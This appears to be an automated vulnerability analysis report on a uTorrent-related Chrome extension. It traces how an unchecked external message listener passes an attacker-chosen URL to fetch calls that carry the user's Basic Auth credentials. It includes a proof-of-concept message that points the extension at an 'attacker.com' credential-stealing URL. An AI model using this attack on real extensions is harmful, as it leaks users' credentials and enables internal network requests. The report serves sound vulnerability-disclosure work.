# CoCo Analysis: ambjmopdihmdndfenlecimbfdbgngeea

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (fetch_resource_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ambjmopdihmdndfenlecimbfdbgngeea/opgen_generated_files/bg.js
Line 1179 (message.url)
Line 1055 (encodeURI(link))
Line 1063 (fetch(settings.host + params))
Line 1095 (fetch(link)) - in downloadLink function

**Code:**

```javascript
// Background script (background.js)
// Entry point - External message listener (Line 1175-1190)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {  // ← ANY external extension can send messages
    switch (message.type) {
      case 'ADD_TORRENT':
        if (message.url && message.url.startsWith('magnet:'))  // ← attacker controls message.url
          withSettings((settings) => {
            addTorrents(settings, message.url, message.folder)  // ← attacker controls url and folder
          })
        else
          withSettings((settings) => {
            downloadLink(settings, message.url, message.folder)  // ← DANGEROUS PATH
          })
        break
    }
  }
)

// Sink path 1: addTorrents function (Lines 1052-1088)
function addTorrents(settings, link, where) {  // ← link = attacker-controlled message.url
  GetTokenNew(settings, function (token, cookie) {
    let params =
      '?action=add-url&download_dir=0&token=' + token + '&s=' + encodeURI(link)  // ← attacker data in params

    if (where !== ROOT_FOLDER) params += '&path=' + where  // ← attacker controls 'where' too

    const myHeaders = new Headers({
      Authorization: 'Basic ' + btoa(settings.user + ':' + settings.password),
    })

    return fetch(settings.host + params, {  // ← fetch with attacker-controlled params
      method: 'GET',
      headers: myHeaders,
    })
    // ...
  })
}

// Sink path 2: downloadLink function (Lines 1090-1167) - DIRECT SSRF
function downloadLink(settings, link, where) {  // ← link = attacker-controlled message.url
  const myHeaders = new Headers({
    Authorization: 'Basic ' + btoa(settings.user + ':' + settings.password),
  })

  return fetch(link, {  // ← DIRECT fetch to attacker-controlled URL!
    method: 'GET',
    headers: myHeaders,  // ← with user's credentials
  })
  // Fetched data is then uploaded to uTorrent
  .then((response) => response.blob())
  .then((response) => {
    // ... processes the response and uploads as torrent
  })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious extension sends message to this extension
chrome.runtime.sendMessage(
  'ambjmopdihmdndfenlecimbfdbgngeea',  // target extension ID
  {
    type: 'ADD_TORRENT',
    url: 'http://attacker.com/steal-credentials',  // ← attacker-controlled URL
    folder: '/'
  }
);
```

**Impact:** Server-Side Request Forgery (SSRF). An attacker can:
1. **Direct SSRF via downloadLink()**: Force the extension to make privileged GET requests to any attacker-controlled URL with the user's uTorrent Basic Auth credentials in the Authorization header. The attacker can steal these credentials by receiving them at their server.
2. **Indirect SSRF via addTorrents()**: Make requests to `settings.host` (user's uTorrent server) with attacker-controlled parameters, potentially exploiting the uTorrent Web UI.
3. **Internal network scanning**: Access internal network resources that the user's machine can reach but external attackers cannot.
4. **Credential theft**: Capture the user's uTorrent username and password sent in the Authorization header to the attacker's server.

The vulnerability exists because the extension accepts messages from ANY external extension via `chrome.runtime.onMessageExternal` without checking the sender, and directly uses the attacker-controlled URL in fetch() calls with the user's credentials.
